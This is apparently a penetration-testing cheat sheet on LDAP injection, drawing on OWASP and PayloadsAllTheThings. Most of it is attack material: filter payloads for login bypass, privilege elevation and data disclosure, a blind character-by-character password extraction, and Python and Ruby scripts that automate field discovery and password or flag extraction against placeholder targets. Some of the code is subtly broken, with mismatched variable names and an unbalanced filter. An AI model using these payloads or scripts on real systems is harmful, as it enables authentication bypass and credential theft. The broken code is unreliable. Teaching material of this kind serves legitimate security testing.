# LDAP INJECTION

## What Is LDAP Injection?

Lightweight Directory Access Protocol (LDAP) injection is a vulnerability in which queries are constructed from untrusted input without prior validation or sanitization. LDAP uses queries constructed from predicates that involve the use of special characters (e.g., brackets, asterisks, ampersands, or quotes). Metacharacters such as these control the meaning of the query; thereby, affecting the type and number of objects retrieved from the underlying directory. If an attacker can submit input containing these control characters, they can alter the query and change the intended behavior.

 - LDAP Injection
   
   - Types of LDAP Injection Attacks

      - Access Control Bypass
      - Elevation of Privileges
      - Information Disclosure

   - LDAP Injection Using Logical Operators

      - AND LDAP Injection
      - AND Blind LDAP Injection
      - OR LDAP Injection
      - OR Blind LDAP Injection

   - Exploitation
   - Blind Exploitation
   - Scripts
      - Discover valid LDAP fields
      - Special blind LDAP injection (without "*")

## Access Control Bypass

    (&(USER=Uname)(PASSWORD=Pwd)) (&(USER=john90)(&))(PASSWORD=Pwd))

## Elevation of Privileges

    "Information)(security_level=*))(&(directory=documents"
    (&(directory=Information)(security_level=*))(&(directory=Information)
    (security_level=low))

## Information Disclosure

    (|(type=Resource1)(type=Resource2)) (|(type=Jeans)(uid=*))(type=T-Shirts)

# LDAP Injection Using Logical Operators
  
  ## AND LDAP Injection

     (&(parameter1=value1)(parameter2=value2))

  ## AND Blind LDAP Injection

     (&(objectClass=*)(objectClass=users))(&(objectClass=foo)(type=Puma*))
     (&(objectClass=*)(objectClass=Resources))(&(objectClass=foo)(type=Puma*))

  ## OR LDAP Injection

     (|(parameter=value1)(parameter2=value2)

  ## OR Blind LDAP Injection

     (|(objectClass=void)(objectClass=users))(&(objectClass=void)(type=Puma*))

# Exploitation

  ## Example 1.
 
     user  = *)(uid=*))(|(uid=*
     pass  = password
     query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"

  ## Example 2.

     user  = admin)(!(&(1=0
     pass  = q))
     query = (&(uid=admin)(!(&(1=0)(userPassword=q))))

# Blind Exploitation

  We can extract using a bypass login

    (&(sn=administrator)(password=*))  : OK
    (&(sn=administrator)(password=A*)) : OK
    (&(sn=administrator)(password=B*)) : OK

    (&(sn=administrator)(password=M*))  : OK
    (&(sn=administrator)(password=MA*)) : OK
    (&(sn=administrator)(password=MB*)) : OK

    (&(sn=administrator)(password=MY*))  : OK
    (&(sn=administrator)(password=MYA*)) : OK
    (&(sn=administrator)(password=MYB*)) : OK
    (&(sn=administrator)(password=MYC*)) : OK

    (&(sn=administrator)(password=MYK*)) : OK
    (&(sn=administrator)(password=MYKE)) : OK

# Scripts

 ## Discover valid LDAP fields

    #!/usr/bin/python3

    import requests
    import string

    fields = []

    url = 'https://URL.com/'

    f = open('dic', 'r') #Open the wordlists of common attributes
    wordl = f.read().split('\n')
    f.close()

    for i in world:
      r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
      if 'TRUE CONDITION' in r.text:
         fields.append(str(i))

    print(fields)

  ## Special blind LDAP injection (without "*")

    #!/usr/bin/python3

    import requests, string
    alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

    flag = ""
    for i in range(50):
        print("[i] Looking for number " + str(I))
        for char in alphabet:
            r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
            if ("TRUE CONDITION" in r.text):
                flag += char
                print("[+] Flag: " + flag)
                break
                
 ---
                
    #!/usr/bin/env ruby

    require 'net/http'
    alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

    flag = ''

    (0..50).each do |i|
      puts("[i] Looking for number #{i}")
      alphabet.each do |char|
        r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
        if /TRUE CONDITION/.match?(r)
          flag += char
          puts("[+] Flag: #{flag}")
          break
        end
      end
    end

# References

  [OWASP](https://owasp.org/www-community/attacks/LDAP_Injection)  
  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)  
  [ldap](https://ldap.com/basic-ldap-concepts/)  
  [okta](https://www.okta.com/identity-101/what-is-ldap/)
